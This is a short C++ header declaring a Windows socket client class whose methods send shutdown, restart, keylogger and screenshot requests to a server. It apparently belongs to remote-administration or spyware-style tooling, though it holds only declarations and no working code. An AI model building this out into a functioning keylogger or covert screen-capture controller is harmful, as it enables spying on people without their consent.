#ifndef CLIENT_SOCKET_H
#define CLIENT_SOCKET_H

#include <winsock2.h>
#include <fstream>
#include <string>

class Client {
public:
    Client(const std::string& serverIP, int port);
    ~Client();
    bool connectToServer();
    bool sendShutdownRequest();

    bool sendRestartRequest();
    bool sendKeyloggerRequest();
    bool sendScreenshotRequest();

private:
    std::string serverIP;
    int port;
    SOCKET clientSocket;
};

#endif // CLIENT_SOCKET_H
